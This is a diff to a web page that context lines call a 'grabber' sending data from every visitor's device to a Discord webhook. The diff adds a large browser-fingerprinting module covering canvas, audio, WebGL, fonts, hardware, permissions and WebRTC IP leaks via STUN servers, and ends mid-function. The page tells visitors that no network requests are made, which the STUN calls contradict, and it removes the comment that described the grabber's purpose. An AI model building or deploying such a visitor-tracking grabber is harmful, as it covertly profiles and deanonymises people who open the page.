@@ -61,6 +61,46 @@
     pointer-events:none;
   }
   .result.show{opacity:1;transform:translateY(0);pointer-events:auto}
+
+  /* ── browser info page ── */
+  #info{
+    position:fixed;inset:0;z-index:2;
+    background:#0b0b0c;color:#e8e8e8;
+    font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    padding:24px;max-width:960px;margin:0 auto;
+    overflow-y:auto;display:none;
+  }
+  #info.show{display:block}
+  #info h1{font-size:15px;font-weight:600;margin-bottom:4px}
+  #info .sub{color:#777;font-size:11px;margin-bottom:20px}
+  #info .notice{
+    background:#151518;border:1px solid #26262b;border-left:2px solid #4a9;
+    border-radius:6px;padding:10px 14px;font-size:11px;color:#8a9;margin-bottom:20px;
+  }
+  #info section{margin-bottom:22px}
+  #info h2{
+    font-size:11px;font-weight:600;color:#8a8a92;text-transform:uppercase;
+    letter-spacing:.08em;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid #1e1e22;
+  }
+  #info .row{display:flex;gap:12px;padding:4px 0;border-bottom:1px solid #141417}
+  #info .row:last-child{border-bottom:0}
+  #info .k{flex:0 0 210px;color:#777;font-size:11px}
+  #info .v{flex:1;color:#ddd;word-break:break-word;font-size:11px}
+  #info .v.none{color:#555;font-style:italic}
+  #info .v.bad{color:#e88}
+  #info .v.ok{color:#8c8}
+  #info .bar{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap}
+  #info button{
+    background:#1a1a1e;color:#ddd;border:1px solid #2a2a30;border-radius:6px;
+    padding:7px 14px;font:11px ui-monospace,Menlo,Consolas,monospace;cursor:pointer;
+  }
+  #info button:hover{background:#24242a}
+  #info pre{
+    background:#101013;border:1px solid #1e1e22;border-radius:6px;
+    padding:12px;font-size:10px;line-height:1.5;color:#aaa;
+    overflow:auto;max-height:360px;white-space:pre-wrap;word-break:break-all;
+  }
+  #info canvas{display:none}
 </style>
 </head>
 <body>
@@ -77,13 +117,34 @@
   </div>
 </div>
 
+<div id="info">
+  <h1>browser &amp; device info</h1>
+  <div class="sub">every value below is read in your browser and rendered only to you. no network requests are made.</div>
+  <div class="notice">
+    readable: user agent + client hints, screen, GPU, CPU/RAM, fonts, codecs, audio/canvas fingerprints,
+    permissions, media device counts, WebRTC leak.<br>
+    not readable by any web page: browsing history, other sites' cookies, saved passwords, autofill data.
+  </div>
+  <div class="bar">
+    <button id="copy">copy JSON</button>
+    <button id="dl">download JSON</button>
+    <button id="re">re-scan</button>
+    <button id="back">back</button>
+  </div>
+  <div id="iout"></div>
+  <section>
+    <h2>raw JSON</h2>
+    <pre id="json">scanning…</pre>
+  </section>
+  <canvas id="cv" width="280" height="60"></canvas>
+</div>
+
 <script>
 (function(){
   "use strict";
 
   /* ═══════════════════════════════════════════════════════════
      PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW.
-     Required for the grabber to send on every visitor's device.
      ═══════════════════════════════════════════════════════════ */
   const WEBHOOK = "";
 
@@ -94,7 +155,7 @@
   const $ = id => document.getElementById(id);
   const clean = s => (s || "").trim().replace(/\/+$/, "");
 
-  /* ── snowfall ── */
+  /* ── snowfall (only on grabber page) ── */
   (function(){
     const c = $("snow"), x = c.getContext("2d");
     let w, h, f = [];
@@ -507,7 +568,814 @@
     });
   }
 
+  /* ══════════════════════════════════════════════════════════
+     BROWSER INFO PAGE (from second snippet)
+     ══════════════════════════════════════════════════════════ */
+  const I = id => document.getElementById(id);
+
+  function browserName(ua){
+    const list = [
+      ["Edge",    /Edg(?:e|A|iOS)?\/([\d.]+)/],
+      ["Opera",   /(?:OPR|Opera)\/([\d.]+)/],
+      ["Samsung", /SamsungBrowser\/([\d.]+)/],
+      ["Firefox", /(?:Firefox|FxiOS)\/([\d.]+)/],
+      ["Chrome",  /(?:Chrome|CriOS)\/([\d.]+)/],
+      ["Safari",  /Version\/([\d.]+).*Safari/]
+    ];
+    for(const [n, re] of list){
+      const m = ua.match(re);
+      if(m) return n + " " + m[1];
+    }
+    return "unknown";
+  }
+
+  function osName(ua){
+    if(/Windows NT 10/.test(ua)) return "Windows 10/11";
+    if(/Windows NT 6\.3/.test(ua)) return "Windows 8.1";
+    if(/Windows NT 6\.1/.test(ua)) return "Windows 7";
+    if(/Windows/.test(ua)) return "Windows";
+    const a = ua.match(/Android ([\d.]+)/);
+    if(a) return "Android " + a[1];
+    if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
+    const m = ua.match(/Mac OS X ([\d_]+)/);
+    if(m) return "macOS " + m[1].replace(/_/g, ".");
+    if(/CrOS/.test(ua)) return "ChromeOS";
+    if(/Linux/.test(ua)) return "Linux";
+    return "unknown";
+  }
+
+  function canvasHash(){
+    try{
+      const c = I("cv");
+      const x = c.getContext("2d");
+      x.textBaseline = "top";
+      x.font = "14px 'Arial'";
+      x.fillStyle = "#f60";
+      x.fillRect(0, 0, 100, 20);
+      x.fillStyle = "#069";
+      x.fillText("canvas-fp-\u2603", 2, 2);
+      x.fillStyle = "rgba(102,204,0,0.7)";
+      x.fillText("canvas-fp-\u2603", 4, 6);
+      const d = c.toDataURL();
+      let h = 5381;
+      for(let i = 0; i < d.length; i++) h = ((h << 5) + h + d.charCodeAt(i)) | 0;
+      return (h >>> 0).toString(16);
+    }catch(e){ return null; }
+  }
+
+  async function audioFingerprint(){
+    try{
+      const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+      if(!Ctx) return null;
+      const ctx = new Ctx(1, 44100, 44100);
+      const osc = ctx.createOscillator();
+      osc.type = "triangle";
+      osc.frequency.value = 10000;
+      const comp = ctx.createDynamicsCompressor();
+      comp.threshold.value = -50;
+      comp.knee.value = 40;
+      comp.ratio.value = 12;
+      comp.attack.value = 0;
+      comp.release.value = 0.25;
+      osc.connect(comp);
+      comp.connect(ctx.destination);
+      osc.start(0);
+      const buf = await ctx.startRendering();
+      const data = buf.getChannelData(0);
+      let sum = 0;
+      for(let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
+      const raw = sum.toString();
+      let h = 0;
+      for(let i = 0; i < raw.length; i++) h = ((h << 5) - h + raw.charCodeAt(i)) | 0;
+      return { hash: (h >>> 0).toString(16), sample: +sum.toFixed(10) };
+    }catch(e){ return null; }
+  }
+
+  function webglInfo(){
+    try{
+      const c = document.createElement("canvas");
+      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if(!gl) return null;
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      const paramKeys = [
+        "MAX_TEXTURE_SIZE","MAX_CUBE_MAP_TEXTURE_SIZE","MAX_RENDERBUFFER_SIZE",
+        "MAX_VIEWPORT_DIMS","MAX_VERTEX_ATTRIBS","MAX_VERTEX_UNIFORM_VECTORS",
+        "MAX_FRAGMENT_UNIFORM_VECTORS","MAX_VARYING_VECTORS",
+        "MAX_COMBINED_TEXTURE_IMAGE_UNITS","MAX_TEXTURE_IMAGE_UNITS",
+        "MAX_VERTEX_TEXTURE_IMAGE_UNITS","ALIASED_LINE_WIDTH_RANGE",
+        "ALIASED_POINT_SIZE_RANGE","MAX_3D_TEXTURE_SIZE","MAX_ARRAY_TEXTURE_LAYERS",
+        "MAX_DRAW_BUFFERS","MAX_COLOR_ATTACHMENTS"
+      ];
+      const params = {};
+      for(const k of paramKeys){
+        const p = gl[k];
+        if(p === undefined) continue;
+        try{
+          const v = gl.getParameter(p);
+          params[k] = (v && typeof v.length === "number" && typeof v !== "string")
+            ? Array.from(v) : v;
+        }catch(e){}
+      }
+      return {
+        vendor:        dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
+        renderer:      dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+        version:       gl.getParameter(gl.VERSION),
+        glslVersion:   gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+        antialias:     gl.getContextAttributes() ? gl.getContextAttributes().antialias : null,
+        extensions:    (gl.getSupportedExtensions() || []).sort(),
+        extensionCount:(gl.getSupportedExtensions() || []).length,
+        params
+      };
+    }catch(e){ return null; }
+  }
+
+  const FONT_CANDIDATES = [
+    "Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Arial Unicode MS",
+    "Bahnschrift","Calibri","Cambria","Cambria Math","Candara","Comic Sans MS",
+    "Consolas","Constantia","Corbel","Courier New","DejaVu Sans","DejaVu Sans Mono",
+    "DejaVu Serif","Ebrima","Franklin Gothic Medium","Futura","Gabriola","Gadugi",
+    "Garamond","Georgia","Gill Sans","Helvetica","Helvetica Neue","Impact",
+    "Lucida Console","Lucida Grande","Lucida Sans","Lucida Sans Unicode",
+    "Malgun Gothic","Marlett","Menlo","Microsoft Sans Serif","Monaco",
+    "MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Nirmala UI",
+    "Noto Sans","Noto Serif","Optima","Oxygen","Palatino","Palatino Linotype",
+    "PT Sans","Roboto","Segoe Print","Segoe Script","Segoe UI","Segoe UI Emoji",
+    "Segoe UI Historic","Segoe UI Symbol","SimSun","Sitka","Source Sans Pro",
+    "Sylfaen","Symbol","Tahoma","Times New Roman","Trebuchet MS","Ubuntu",
+    "Verdana","Webdings","Wingdings","Yu Gothic","Cantarell","Fira Sans",
+    "Droid Sans","Droid Sans Mono","Droid Serif","FreeSans","FreeSerif"
+  ];
+
+  function detectFonts(){
+    const base = ["monospace", "sans-serif", "serif"];
+    const probe = "mmmmmmmmmmlliWWWW";
+    const span = document.createElement("span");
+    span.style.cssText =
+      "position:absolute;left:-9999px;top:-9999px;font-size:72px;" +
+      "visibility:hidden;white-space:nowrap;";
+    span.textContent = probe;
+    document.body.appendChild(span);
+    const baseline = {};
+    for(const b of base){
+      span.style.fontFamily = b;
+      baseline[b] = { w: span.offsetWidth, h: span.offsetHeight };
+    }
+    const found = [];
+    for(const f of FONT_CANDIDATES){
+      let hit = false;
+      for(const b of base){
+        span.style.fontFamily = "'" + f + "'," + b;
+        if(span.offsetWidth !== baseline[b].w || span.offsetHeight !== baseline[b].h){
+          hit = true;
+          break;
+        }
+      }
+      if(hit) found.push(f);
+    }
+    span.remove();
+    return found;
+  }
+
+  function textMetrics(){
+    try{
+      const c = document.createElement("canvas");
+      const x = c.getContext("2d");
+      const out = {};
+      const text = "mmmMMMwwwiiilll0123456789";
+      for(const f of ["sans-serif", "serif", "monospace"]){
+        x.font = "16px " + f;
+        out[f] = +(x.measureText(text).width).toFixed(4);
+      }
+      x.font = "16px sans-serif";
+      out.emoji  = +(x.measureText("\u{1F600}\u{1F389}\u{1F680}").width).toFixed(4);
+      out.cjk    = +(x.measureText("\u65E5\u672C\u8A9E\uD55C\uAD6D\uC5B4\u4E2D\u6587").width).toFixed(4);
+      out.rtl    = +(x.measureText("\u0645\u0631\u062D\u0628\u0627").width).toFixed(4);
+      out.astral = +(x.measureText("\u{1D518}\u{1D52B}\u{1D526}").width).toFixed(4);
+      out.combining = +(x.measureText("a\u0301e\u0302i\u0303").width).toFixed(4);
+      return out;
+    }catch(e){ return null; }
+  }
+
+  function mathFingerprint(){
+    const out = {};
+    const probes = [
+      ["tan",    Math.tan(-1e300)],
+      ["sin",    Math.sin(1e300)],
+      ["cos",    Math.cos(1e300)],
+      ["acos",   Math.acos(1.000000000000001)],
+      ["asin",   Math.asin(1.000000000000001)],
+      ["atan",   Math.atan(1e300)],
+      ["atan2",  Math.atan2(1e300, 1e-300)],
+      ["exp",    Math.exp(1e300)],
+      ["log",    Math.log(1e300)],
+      ["log1p",  Math.log1p(1e-300)],
+      ["sqrt",   Math.sqrt(1e300)],
+      ["pow",    Math.pow(1e300, 1e-300)],
+      ["sinh",   Math.sinh(1)],
+      ["tanh",   Math.tanh(1)],
+      ["cbrt",   Math.cbrt(100)],
+      ["hypot",  Math.hypot(1e300, 1e300)]
+    ];
+    for(const [k, v] of probes) out[k] = v;
+    try{ out.numberFormat = new Intl.NumberFormat().format(1234567.891); }catch(e){}
+    try{ out.dateFormat = new Intl.DateTimeFormat().format(new Date(2024, 0, 1)); }catch(e){}
+    try{ out.collator = ["a","b","c"].sort(new Intl.Collator().compare).join(""); }catch(e){}
+    try{ out.pluralRules = new Intl.PluralRules().select(1.5); }catch(e){}
+    try{ out.listFormat = new Intl.ListFormat().format(["a","b","c"]); }catch(e){}
+    try{ out.relativeTime = new Intl.RelativeTimeFormat().format(-1, "day"); }catch(e){}
+    return out;
+  }
+
+  function errorStackShape(){
+    try{
+      const e = new Error("x");
+      const s = (e.stack || "").split("\n");
+      return {
+        firstLine: (s[0] || "").slice(0, 140),
+        lineCount: s.length,
+        hasEval:   /eval/.test(e.stack || "")
+      };
+    }catch(e){ return null; }
+  }
+
+  function timerPrecision(){
+    try{
+      const samples = [];
+      for(let i = 0; i < 6; i++){
+        const t0 = performance.now();
+        let t1 = performance.now(), guard = 0;
+        while(t1 === t0 && guard++ < 1e6) t1 = performance.now();
+        const d = t1 - t0;
+        if(d > 0) samples.push(d);
+      }
+      const min = samples.length ? Math.min(...samples) : null;
+      return {
+        timeOrigin:      performance.timeOrigin ? Math.round(performance.timeOrigin) : null,
+        minDeltaMs:      min !== null ? +min.toFixed(6) : null,
+        reducedPrecision: min !== null && min >= 1
+      };
+    }catch(e){ return null; }
+  }
+
+  const VIDEO_CODECS = [
+    'video/mp4; codecs="avc1.42E01E"',
+    'video/mp4; codecs="avc1.4D401E"',
+    'video/mp4; codecs="hvc1.1.6.L93.B0"',
+    'video/mp4; codecs="av01.0.05M.08"',
+    'video/webm; codecs="vp8"',
+    'video/webm; codecs="vp9"',
+    'video/webm; codecs="av01.0.05M.08"',
+    'video/ogg; codecs="theora"'
+  ];
+  const AUDIO_CODECS = [
+    'audio/mpeg',
+    'audio/ogg; codecs="vorbis"',
+    'audio/ogg; codecs="opus"',
+    'audio/wav; codecs="1"',
+    'audio/mp4; codecs="mp4a.40.2"',
+    'audio/flac',
+    'audio/webm; codecs="opus"',
+    'audio/aac'
+  ];
+
+  function codecSupport(){
+    const v = document.createElement("video");
+    const a = document.createElement("audio");
+    const out = { video:{}, audio:{} };
+    for(const c of VIDEO_CODECS){
+      try{ out.video[c] = v.canPlayType(c) || "no"; }catch(e){ out.video[c] = "err"; }
+    }
+    for(const c of AUDIO_CODECS){
+      try{ out.audio[c] = a.canPlayType(c) || "no"; }catch(e){ out.audio[c] = "err"; }
+    }
+    return out;
+  }
+
+  const MEDIA_QUERIES = [
+    "prefers-color-scheme: dark",
+    "prefers-color-scheme: light",
+    "prefers-reduced-motion: reduce",
+    "prefers-reduced-motion: no-preference",
+    "prefers-reduced-transparency: reduce",
+    "prefers-contrast: more",
+    "prefers-contrast: less",
+    "forced-colors: active",
+    "inverted-colors: inverted",
+    "hover: hover",
+    "hover: none",
+    "any-hover: hover",
+    "pointer: fine",
+    "pointer: coarse",
+    "pointer: none",
+    "any-pointer: fine",
+    "any-pointer: coarse",
+    "display-mode: standalone",
+    "display-mode: fullscreen",
+    "display-mode: minimal-ui",
+    "display-mode: browser",
+    "orientation: portrait",
+    "orientation: landscape",
+    "dynamic-range: high",
+    "color-gamut: p3",
+    "color-gamut: rec2020",
+    "scripting: enabled",
+    "update: fast",
+    "overflow-block: scroll",
+    "overflow-inline: scroll"
+  ];
+
+  function mediaQueryState(){
+    const out = {};
+    for(const q of MEDIA_QUERIES){
+      try{ out[q] = matchMedia("(" + q + ")").matches; }catch(e){ out[q] = null; }
+    }
+    return out;
+  }
+
+  async function highEntropyHints(){
+    const uad = navigator.userAgentData;
+    if(!uad || typeof uad.getHighEntropyValues !== "function") return null;
+    try{
+      const h = await uad.getHighEntropyValues([
+        "architecture","bitness","model","platformVersion","uaFullVersion",
+        "fullVersionList","wow64","formFactors"
+      ]);
+      return {
+        architecture:    h.architecture    ?? null,
+        bitness:         h.bitness         ?? null,
+        model:           h.model           ?? null,
+        platformVersion: h.platformVersion ?? null,
+        uaFullVersion:   h.uaFullVersion   ?? null,
+        wow64:           h.wow64           ?? null,
+        formFactors:     h.formFactors     ?? null,
+        fullVersionList: h.fullVersionList
+          ? h.fullVersionList.map(b => b.brand + " " + b.version)
+          : null
+      };
+    }catch(e){ return null; }
+  }
+
+  function speechVoices(){
+    return new Promise(resolve => {
+      if(!window.speechSynthesis || typeof speechSynthesis.getVoices !== "function")
+        return resolve(null);
+      const collect = () => (speechSynthesis.getVoices() || [])
+        .map(v => v.name + " (" + v.lang + ")");
+      let v = collect();
+      if(v.length) return resolve(v);
+      let done = false;
+      const finish = () => {
+        if(done) return;
+        done = true;
+        resolve(collect());
+      };
+      try{ speechSynthesis.onvoiceschanged = finish; }catch(e){}
+      setTimeout(finish, 1200);
+    });
+  }
+
+  function webrtcLeak(ms){
+    return new Promise(resolve => {
+      const out = { local:[], stun:[] };
+      let pc;
+      try{
+        pc = new RTCPeerConnection({
+          iceServers:[
+            {urls:"stun:stun.l.google.com:19302"},
+            {urls:"stun:stun.cloudflare.com:3478"}
+          ]
+        });
+      }catch(e){ return resolve(out); }
+      let done = false;
+      const finish = () => {
+        if(done) return;
+        done = true;
+        try{ pc.close(); }catch(e){}
+        resolve(out);
+      };
+      const timer = setTimeout(finish, ms);
+      pc.onicecandidate = e => {
+        if(!e.candidate){ clearTimeout(timer); return finish(); }
+        const ip = e.candidate.candidate.split(" ")[4];
+        if(!ip || /\.local$/i.test(ip)) return;
+        const priv = /^(10\.|127\.|192\.168\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|fe80|fc|fd|::1)/i.test(ip);
+        (priv ? out.local : out.stun).push(ip);
+      };
+      try{
+        pc.createDataChannel("probe");
+        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+      }catch(e){ clearTimeout(timer); finish(); }
+    });
+  }
+
+  async function storageInfo(){
+    try{
+      if(!navigator.storage) return null;
+      const out = {};
+      if(navigator.storage.estimate){
+        const e = await navigator.storage.estimate();
+        out.quotaMB = e.quota ? Math.round(e.quota / 1048576) : null;
+        out.usageMB = e.usage != null ? +(e.usage / 1048576).toFixed(2) : null;
+      }
+      if(navigator.storage.persisted){
+        try{ out.persisted = await navigator.storage.persisted(); }catch(e){}
+      }
+      return out;
+    }catch(e){ return null; }
+  }
+
+  async function permissionStates(){
+    const names = [
+      "geolocation","notifications","camera","microphone",
+      "clipboard-read","clipboard-write","midi",
+      "background-sync","persistent-storage","accelerometer","gyroscope"
+    ];
+    const out = {};
+    if(!navigator.permissions || !navigator.permissions.query) return out;
+    await Promise.all(names.map(async n => {
+      try{
+        const s = await navigator.permissions.query({name:n});
+        out[n] = s.state;
+      }catch(e){}
+    }));
+    return out;
+  }
+
+  async function mediaCounts(){
+    try{
+      if(!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
+      const d = await navigator.mediaDevices.enumerateDevices();
+      return {
+        audioIn:  d.filter(x => x.kind === "audioinput").length,
+        audioOut: d.filter(x => x.kind === "audiooutput").length,
+        videoIn:  d.filter(x => x.kind === "videoinput").length,
+        labelsHidden: d.every(x => !x.label)
+      };
+    }catch(e){ return null; }
+  }
+
+  function batteryInfo(){
+    if(!navigator.getBattery) return Promise.resolve(null);
+    return navigator.getBattery().then(b => ({
+      level: Math.round(b.level * 100) + "%",
+      charging: b.charging,
+      dischargeMinutes: b.dischargingTime === Infinity
+        ? null : Math.round(b.dischargingTime / 60)
+    })).catch(() => null);
+  }
+
+  function featureFlags(){
+    const tryIt = fn => { try{ return fn(); }catch(e){ return false; } };
+    return {
+      cookiesEnabled:    navigator.cookieEnabled,
+      localStorage:      tryIt(() => { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); return true; }),
+      sessionStorage:    tryIt(() => { sessionStorage.setItem("_t","1"); sessionStorage.removeItem("_t"); return true; }),
+      indexedDB:         !!window.indexedDB,
+      serviceWorker:     "serviceWorker" in navigator,
+      webAssembly:       typeof WebAssembly === "object",
+      webgl:             tryIt(() => !!document.createElement("canvas").getContext("webgl")),
+      webgl2:            tryIt(() => !!document.createElement("canvas").getContext("webgl2")),
+      webgpu:            "gpu" in navigator,
+      sharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
+      crossOriginIsolated: !!window.crossOriginIsolated,
+      originAgentCluster:  !!window.originAgentCluster,
+      webdriver:         navigator.webdriver === true,
+      pdfViewer:         navigator.pdfViewerEnabled ?? null,
+      doNotTrack:        navigator.doNotTrack || window.doNotTrack || "unspecified",
+      plugins:           (() => { try{ return Array.from(navigator.plugins || []).map(p => p.name); }catch(e){ return []; } })(),
+      mimeTypes:         (() => { try{ return Array.from(navigator.mimeTypes || []).map(m => m.type); }catch(e){ return []; } })()
+    };
+  }
+
+  async function scan(){
+    const n = navigator, s = screen;
+    const conn = n.connection || n.mozConnection || n.webkitConnection || {};
+    let tz = null, locale = null;
+    try{
+      const dtf = Intl.DateTimeFormat().resolvedOptions();
+      tz = dtf.timeZone;
+      locale = dtf.locale;
+    }catch(e){}
+
+    const [
+      rt, storage, perms, media, battery, hints, voices, audio
+    ] = await Promise.all([
+      webrtcLeak(2000),
+      storageInfo(),
+      permissionStates(),
+      mediaCounts(),
+      batteryInfo(),
+      highEntropyHints(),
+      speechVoices(),
+      audioFingerprint()
+    ]);
+
+    const gl = webglInfo();
+
+    return {
+      browser: {
+        name:       browserName(n.userAgent),
+        userAgent:  n.userAgent,
+        vendor:     n.vendor || null,
+        appVersion: n.appVersion || null,
+        os:         osName(n.userAgent),
+        platform:   n.platform || null,
+        product:    n.product || null,
+        productSub: n.productSub || null,
+        uaData:     n.userAgentData ? {
+          brands:   n.userAgentData.brands,
+          mobile:   n.userAgentData.mobile,
+          platform: n.userAgentData.platform
+        } : null,
+        highEntropy: hints
+      },
+      display: {
+        screen:           s.width + "\u00d7" + s.height,
+        availScreen:      s.availWidth + "\u00d7" + s.availHeight,
+        viewport:         innerWidth + "\u00d7" + innerHeight,
+        outerWindow:      outerWidth + "\u00d7" + outerHeight,
+        devicePixelRatio: devicePixelRatio || 1,
+        colorDepth:       s.colorDepth,
+        pixelDepth:       s.pixelDepth,
+        orientationType:  (s.orientation && s.orientation.type) || null,
+        orientationAngle: (s.orientation && s.orientation.angle) ?? null
+      },
+      hardware: {
+        cpuCores:       n.hardwareConcurrency || null,
+        deviceMemoryGB: n.deviceMemory || null,
+        maxTouchPoints: n.maxTouchPoints || 0,
+        battery
+      },
+      locale: {
+        language:     n.language || null,
+        languages:    n.languages || [],
+        timezone:     tz,
+        locale:       locale,
+        utcOffsetMin: new Date().getTimezoneOffset(),
+        dateString:   new Date().toString()
+      },
+      network: {
+        effectiveType: conn.effectiveType || null,
+        downlinkMbps:  conn.downlink ?? null,
+        rttMs:         conn.rtt ?? null,
+        saveData:      conn.saveData ?? null,
+        online:        n.onLine,
+        webrtcLocal:   [...new Set(rt.local)],
+        webrtcStun:    [...new Set(rt.stun)]
+      },
+      storage,
+      permissions:  perms,
+      mediaDevices: media,
+      capabilities: featureFlags(),
+      codecs:       codecSupport(),
+      mediaQueries: mediaQueryState(),
+      fonts:        detectFonts(),
+      webgl:        gl,
+      speechVoices: voices,
+      fingerprint: {
+        canvas:      canvasHash(),
+        audio:       audio,
+        textMetrics: textMetrics(),
+        math:        mathFingerprint(),
+        errorStack:  errorStackShape(),
+        timer:       timerPrecision()
+      },
+      page: {
+        url:           location.href,
+        origin:        location.origin,
+        referrer:      document.referrer || null,
+        title:         document.title,
+        historyLength: history.length,
+        visibility:    document.visibilityState,
+        charset:       document.characterSet,
+        contentType:   document.contentType
+      }
+    };
+  }
+
+  function esc(v){
+    if(v === null || v === undefined) return '<span class="v none">not available</span>';
+    if(Array.isArray(v)) return v.length ? esc(v.join(", ")) : '<span class="v none">none</span>';
+    if(typeof v === "object") return esc(JSON.stringify(v));
+    if(v === true)  return '<span class="v ok">yes</span>';
+    if(v === false) return '<span class="v bad">no</span>';
+    return String(v)
+      .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  }
+
+  function section(title, rows){
+    const body = rows
+      .filter(Boolean)
+      .map(([k, v]) => `<div class="row"><div class="k">${k}</div><div class="v">${esc(v)}</div></div>`)
+      .join("");
+    return `<section><h2>${title}</h2>${body}</section>`;
+  }
+
+  function render(d){
+    const p  = d.permissions || {};
+    const md = d.mediaDevices;
+    const cap = d.capabilities;
+
+    const codecRows = [
+      ...Object.entries(d.codecs.video).map(([k, v]) => ["v " + k, v]),
+      ...Object.entries(d.codecs.audio).map(([k, v]) => ["a " + k, v])
+    ];
+    const mqRows = Object.entries(d.mediaQueries).map(([k, v]) => [k, v]);
+    const mathRows = Object.entries(d.fingerprint.math).map(([k, v]) =>
+      [k, typeof v === "number" ? v.toPrecision(17) : v]);
+    const textRows = Object.entries(d.fingerprint.textMetrics || {}).map(([k, v]) => [k, v]);
+    const glParams = d.webgl ? Object.entries(d.webgl.params)
+      .map(([k, v]) => [k, Array.isArray(v) ? v.join(", ") : v]) : [];
+
+    I("iout").innerHTML = [
+      section("browser", [
+        ["name",        d.browser.name],
+        ["os",          d.browser.os],
+        ["platform",    d.browser.platform],
+        ["vendor",      d.browser.vendor],
+        ["product",     d.browser.product],
+        ["user agent",  d.browser.userAgent],
+        ["ua brands",   d.browser.uaData ? d.browser.uaData.brands.map(b => b.brand + " " + b.version) : null],
+        ["mobile",      d.browser.uaData ? d.browser.uaData.mobile : null],
+        ["architecture", d.browser.highEntropy ? d.browser.highEntropy.architecture : null],
+        ["bitness",      d.browser.highEntropy ? d.browser.highEntropy.bitness : null],
+        ["model",        d.browser.highEntropy ? d.browser.highEntropy.model : null],
+        ["platform ver", d.browser.highEntropy ? d.browser.highEntropy.platformVersion : null],
+        ["ua full ver",  d.browser.highEntropy ? d.browser.highEntropy.uaFullVersion : null],
+        ["wow64",        d.browser.highEntropy ? d.browser.highEntropy.wow64 : null],
+        ["form factors", d.browser.highEntropy ? d.browser.highEntropy.formFactors : null],
+        ["full versions", d.browser.highEntropy ? d.browser.highEntropy.fullVersionList : null]
+      ]),
+      section("display", [
+        ["screen",           d.display.screen],
+        ["available",        d.display.availScreen],
+        ["viewport",         d.display.viewport],
+        ["outer window",     d.display.outerWindow],
+        ["pixel ratio",      d.display.devicePixelRatio],
+        ["color depth",      d.display.colorDepth + "-bit"],
+        ["pixel depth",      d.display.pixelDepth + "-bit"],
+        ["orientation",      d.display.orientationType],
+        ["orientation angle", d.display.orientationAngle]
+      ]),
+      section("hardware", [
+        ["cpu cores",     d.hardware.cpuCores],
+        ["device memory", d.hardware.deviceMemoryGB ? d.hardware.deviceMemoryGB + " GB" : null],
+        ["touch points",  d.hardware.maxTouchPoints],
+        ["gpu vendor",    d.webgl ? d.webgl.vendor : null],
+        ["gpu renderer",  d.webgl ? d.webgl.renderer : null],
+        ["battery",       d.hardware.battery
+          ? d.hardware.battery.level + " · " + (d.hardware.battery.charging ? "charging" : "discharging")
+          : null]
+      ]),
+      section("locale &amp; time", [
+        ["language",   d.locale.language],
+        ["languages",  d.locale.languages],
+        ["locale",     d.locale.locale],
+        ["timezone",   d.locale.timezone],
+        ["utc offset", (-d.locale.utcOffsetMin / 60) + "h"],
+        ["local time", d.locale.dateString]
+      ]),
+      section("network", [
+        ["online",           d.network.online],
+        ["effective type",   d.network.effectiveType],
+        ["downlink",         d.network.downlinkMbps != null ? d.network.downlinkMbps + " Mb/s" : null],
+        ["rtt",              d.network.rttMs != null ? d.network.rttMs + " ms" : null],
+        ["save data",        d.network.saveData],
+        ["webrtc local IPs", d.network.webrtcLocal],
+        ["webrtc STUN IPs",  d.network.webrtcStun]
+      ]),
+      section("storage", [
+        ["localStorage",   cap.localStorage],
+        ["sessionStorage", cap.sessionStorage],
+        ["indexedDB",      cap.indexedDB],
+        ["service worker", cap.serviceWorker],
+        ["quota",          d.storage && d.storage.quotaMB ? d.storage.quotaMB + " MB" : null],
+        ["in use",         d.storage && d.storage.usageMB != null ? d.storage.usageMB + " MB" : null],
+        ["persisted",      d.storage ? d.storage.persisted : null]
+      ]),
+      section("permissions", Object.keys(p).length
+        ? Object.entries(p).map(([k, v]) => [k, v])
+        : [["status", "permissions API unavailable"]]),
+      section("media devices", md ? [
+        ["cameras",     md.videoIn],
+        ["microphones", md.audioIn],
+        ["speakers",    md.audioOut],
+        ["labels",      md.labelsHidden ? "hidden until permission granted" : "visible"]
+      ] : [["status", "enumerateDevices unavailable"]]),
+      section("capabilities", [
+        ["cookies enabled",   cap.cookiesEnabled],
+        ["webgl",             cap.webgl],
+        ["webgl2",            cap.webgl2],
+        ["webgpu",            cap.webgpu],
+        ["webassembly",       cap.webAssembly],
+        ["sharedArrayBuffer", cap.sharedArrayBuffer],
+        ["crossOriginIsolated", cap.crossOriginIsolated],
+        ["originAgentCluster",  cap.originAgentCluster],
+        ["webdriver",         cap.webdriver],
+        ["pdf viewer",        cap.pdfViewer],
+        ["do not track",      cap.doNotTrack],
+        ["plugins",           cap.plugins],
+        ["mime types",        cap.mimeTypes]
+      ]),
+      section("fonts installed (" + d.fonts.length + ")", [
+        ["detected", d.fonts.length ? d.fonts : null]
+      ]),
+      section("webgl", d.webgl ? [
+        ["vendor",      d.webgl.vendor],
+        ["renderer",    d.webgl.renderer],
+        ["version",     d.webgl.version],
+        ["glsl",        d.webgl.glslVersion],
+        ["antialias",   d.webgl.antialias],
+        ["extensions",  d.webgl.extensionCount + " — " + d.webgl.extensions.join(", ")],
+        ...glParams
+      ] : [["status", "no WebGL context"]]),
+      section("codecs", codecRows),
+      section("css media queries", mqRows),
+      section("speech voices (" + (d.speechVoices ? d.speechVoices.length : 0) + ")", [
+        ["voices", d.speechVoices && d.speechVoices.length ? d.speechVoices : null]
+      ]),
+      section("fingerprint — canvas / audio", [
+        ["canvas hash",  d.fingerprint.canvas],
